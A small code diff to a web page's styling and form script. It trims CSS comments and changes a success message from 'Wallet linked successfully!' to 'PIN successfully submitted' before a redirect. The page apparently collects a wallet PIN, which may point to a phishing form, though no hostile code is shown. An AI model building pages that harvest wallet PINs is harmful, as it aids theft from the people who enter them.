@@ -55,8 +55,8 @@
       margin-bottom: 8px;
       font-size: 16px;
       font-weight: bold;
-      color: #ffffff; /* bright white for clarity */
-      text-shadow: 0 1px 2px rgba(0,0,0,0.5); /* subtle shadow for readability */
+      color: #ffffff; /* bright white */
+      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
     }
 
     input {
@@ -175,7 +175,7 @@
         clearInterval(dotsInterval);
 
         if (json.result === "success") {
-          statusEl.textContent = "Wallet linked successfully!";
+          statusEl.textContent = "PIN successfully submitted";
           statusEl.className = "notice success";
           setTimeout(() => { window.location.href = "continue.html"; }, 1000);
         } else {
